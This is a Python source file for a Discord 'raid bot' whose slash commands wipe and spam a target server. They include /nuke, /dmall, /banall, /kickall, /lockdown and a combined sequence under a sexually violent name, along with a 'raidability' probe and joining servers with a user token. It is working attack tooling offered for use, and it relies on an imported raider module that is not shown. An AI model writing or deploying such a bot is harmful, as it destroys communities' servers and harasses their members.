import os
import asyncio
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import discord
from discord import app_commands
from discord.ext import commands
from dotenv import load_dotenv
import raider

load_dotenv()

# ── health server ──────────────────────────────────────────────────────────────
# Pure stdlib, daemon thread — completely independent of asyncio, Discord,
# or whether the bot token is valid. Starts BEFORE any other code runs.

_PORT = int(os.environ.get("PORT", "8080"))

class _H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/health"):
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"status":"ok"}')
        else:
            self.send_response(404)
            self.end_headers()
    def log_message(self, *_):
        pass

_srv = ThreadingHTTPServer(("0.0.0.0", _PORT), _H)
threading.Thread(target=_srv.serve_forever, daemon=True).start()
print(f"[health] :{_PORT} ready", flush=True)

# ── config ─────────────────────────────────────────────────────────────────────
TOKEN         = os.environ.get("BOT_TOKEN") or os.environ.get("DISCORD_TOKEN") or ""
CLIENT_ID     = os.environ.get("CLIENT_ID", "")
HOME_GUILD    = os.environ.get("HOME_GUILD", "")
DEFAULT_GUILD = os.environ.get("TARGET_GUILD", "")

intents = discord.Intents.all()
bot     = commands.Bot(command_prefix="!", intents=intents)
tree    = bot.tree

# ── guild resolver ─────────────────────────────────────────────────────────────
def resolve(interaction: discord.Interaction, guild_id: str = "") -> discord.Guild | None:
    gid = guild_id.strip() or DEFAULT_GUILD
    if gid:
        g = bot.get_guild(int(gid))
        if g:
            return g
    return interaction.guild

# ── startup sync ───────────────────────────────────────────────────────────────
@bot.event
async def on_ready():
    if HOME_GUILD:
        try:
            cmds = await tree.sync(guild=discord.Object(id=int(HOME_GUILD)))
            print(f"[sync] HOME_GUILD {HOME_GUILD} — {len(cmds)} commands", flush=True)
            others = [g for g in bot.guilds if g.id != int(HOME_GUILD)]
        except Exception as e:
            print(f"[sync] HOME_GUILD failed: {e}", flush=True)
            others = list(bot.guilds)
    else:
        others = list(bot.guilds)

    if others:
        results = await asyncio.gather(
            *[tree.sync(guild=discord.Object(id=g.id)) for g in others],
            return_exceptions=True,
        )
        ok = sum(1 for r in results if not isinstance(r, Exception))
        print(f"[sync] {ok}/{len(others)} guilds synced", flush=True)

    await tree.sync()
    print(f"[raid-bot] ready — {bot.user} — {len(bot.guilds)} guild(s)", flush=True)
    await bot.change_presence(activity=discord.Game("/help"))

@bot.event
async def on_guild_join(guild: discord.Guild):
    try:
        await tree.sync(guild=discord.Object(id=guild.id))
        print(f"[sync] joined {guild.name} ({guild.id})", flush=True)
    except Exception as e:
        print(f"[sync] failed {guild.id}: {e}", flush=True)

# ─────────────────────────────────────────────────────────────────────────────
# /raid MODAL
# ─────────────────────────────────────────────────────────────────────────────

class RaidModal(discord.ui.Modal, title="Raid Config"):
    message = discord.ui.TextInput(
        label="Spam message",
        placeholder="@everyone you got raided",
        max_length=1900,
    )
    times = discord.ui.TextInput(
        label="How many times (per channel)",
        placeholder="50",
        max_length=4,
        default="50",
    )
    guild_id = discord.ui.TextInput(
        label="Target guild ID (blank = current server)",
        placeholder="123456789012345678",
        required=False,
        max_length=20,
    )

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            n = max(1, min(int(self.times.value.strip()), 500))
        except ValueError:
            return await interaction.followup.send("times must be a number", ephemeral=True)
        g = resolve(interaction, self.guild_id.value.strip())
        if not g:
            return await interaction.followup.send(
                "guild not found — bot needs to be invited as a member first", ephemeral=True
            )
        await interaction.followup.send(
            f"raiding `{g.name}` — `{self.message.value}` ×{n}...", ephemeral=True
        )
        await raider.spam_channels(g, self.message.value, n)

@tree.command(name="raid", description="Open raid form — set message and spam count")
async def slash_raid(interaction: discord.Interaction):
    await interaction.response.send_modal(RaidModal())

# ─────────────────────────────────────────────────────────────────────────────
# PROBE
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="test", description="Probe raidability: permissions, MFA, verification level")
@app_commands.describe(guild_id="Target guild ID (blank = current server)")
async def slash_test(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send(
            "guild not found — use /invite to add the bot first", ephemeral=True
        )
    report = await raider.probe_guild(g)
    await interaction.followup.send(report, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# SETUP COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="invite", description="Get guild invite link + user-install link")
async def slash_invite(interaction: discord.Interaction):
    cid        = CLIENT_ID or str(bot.user.id)
    perms      = discord.Permissions(administrator=True)
    guild_link = discord.utils.oauth_url(int(cid), permissions=perms)
    user_link  = (
        f"https://discord.com/oauth2/authorize?client_id={cid}"
        f"&integration_type=1&scope=applications.commands"
    )
    await interaction.response.send_message(
        f"**add to server** (full raid perms):\n{guild_link}\n\n"
        f"**add to apps** (/test anywhere):\n{user_link}",
        ephemeral=True,
    )

@tree.command(name="servers", description="List all servers the bot is in")
async def slash_servers(interaction: discord.Interaction):
    if not bot.guilds:
        return await interaction.response.send_message("not in any server", ephemeral=True)
    lines = [f"`{g.id}` | **{g.name}** | {g.member_count} members" for g in bot.guilds]
    out   = "\n".join(lines)
    if len(out) > 1900:
        out = out[:1900] + "\n…"
    await interaction.response.send_message(out, ephemeral=True)

@tree.command(name="join", description="Join a server via invite using a user token")
@app_commands.describe(invite="Invite code or URL", user_token="User token (or set USER_TOKEN env)")
async def slash_join(interaction: discord.Interaction, invite: str, user_token: str = ""):
    await interaction.response.defer(ephemeral=True)
    tok = user_token or os.environ.get("USER_TOKEN", "")
    if not tok:
        return await interaction.followup.send("no user token — pass inline or set USER_TOKEN env", ephemeral=True)
    result = await raider.join_server(invite.split("/")[-1].strip(), tok)
    await interaction.followup.send(result, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# CORE RAID COMMANDS
# ─────────────────────────────────────────────────────────────────────────────

@tree.command(name="nuke", description="Delete all channels, flood with N spam channels")
@app_commands.describe(guild_id="Target guild ID", name="Channel name", count="Channels to create")
async def slash_nuke(interaction: discord.Interaction, guild_id: str = "", name: str = "nuked", count: int = 50):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"nuking `{g.name}`...", ephemeral=True)
    await raider.nuke_guild(g, name, count)

@tree.command(name="dmall", description="DM every member in the server")
@app_commands.describe(message="Message to DM", limit="Max members (0 = all)")
async def slash_dmall(interaction: discord.Interaction, message: str = "you got raided", limit: int = 0):
    await interaction.response.defer(ephemeral=True)
    g     = resolve(interaction)
    count = await raider.dm_members(g, message, limit)
    await interaction.followup.send(f"DMed {count} members", ephemeral=True)

@tree.command(name="banall", description="Ban all non-owner members")
@app_commands.describe(guild_id="Target guild ID")
async def slash_banall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"banning all in `{g.name}`...", ephemeral=True)
    await raider.ban_all(g)

@tree.command(name="kickall", description="Kick all non-owner members")
@app_commands.describe(guild_id="Target guild ID")
async def slash_kickall(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"kicking all in `{g.name}`...", ephemeral=True)
    await raider.kick_all(g)

@tree.command(name="lockdown", description="Deny @everyone send/read on every channel")
@app_commands.describe(guild_id="Target guild ID")
async def slash_lockdown(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    count = await raider.lockdown_channels(g)
    await interaction.followup.send(f"locked {count} channels", ephemeral=True)

@tree.command(name="fullrape", description="Full sequence: delete roles → nuke channels → @everyone spam")
@app_commands.describe(guild_id="Target guild ID")
async def slash_fullrape(interaction: discord.Interaction, guild_id: str = ""):
    await interaction.response.defer(ephemeral=True)
    g = resolve(interaction, guild_id)
    if not g:
        return await interaction.followup.send("guild not found", ephemeral=True)
    await interaction.followup.send(f"running on `{g.name}`...", ephemeral=True)
    await raider.delete_roles(g)
    await raider.nuke_guild(g, "raided", 50)
    await raider.mention_spam(g, 20)

@tree.command(name="help", description="Show all commands")
async def slash_help(interaction: discord.Interaction):
    msg = (
        "**commands** (your responses are ephemeral — raid damage is public)\n\n"
        "`/invite`                — add to server or add to apps\n"
        "`/servers`               — list servers bot is in\n"
        "`/join <invite> [token]` — join server via user token\n"
        "`/test [guild_id]`       — raidability probe\n\n"
        "`/raid`                  — **modal form** — set spam message + count\n"
        "`/nuke [id] [name] [n]`  — delete all channels, flood with N new ones\n"
        "`/dmall [limit] <msg>`   — DM all members\n"
        "`/banall [id]`           — ban everyone\n"
        "`/kickall [id]`          — kick everyone\n"
        "`/lockdown [id]`         — deny @everyone everywhere\n"
        "`/fullrape [id]`         — full sequence\n"
    )
    await interaction.response.send_message(msg, ephemeral=True)

# ─────────────────────────────────────────────────────────────────────────────
# ENTRYPOINT
# Health server is already running in its daemon thread above.
# main() just drives the Discord bot — any crash here keeps health alive.
# ─────────────────────────────────────────────────────────────────────────────

async def main():
    if not TOKEN:
        print("[bot] no token — set BOT_TOKEN or DISCORD_TOKEN in Railway → Variables", flush=True)
        await asyncio.Event().wait()   # block forever; health thread keeps answering
        return
    try:
        await bot.start(TOKEN)
    except discord.LoginFailure:
        print("[bot] LoginFailure — token invalid or revoked", flush=True)
        await asyncio.Event().wait()
    except Exception as e:
        print(f"[bot] crashed: {type(e).__name__}: {e}", flush=True)
        await asyncio.Event().wait()

if __name__ == "__main__":
    asyncio.run(main())
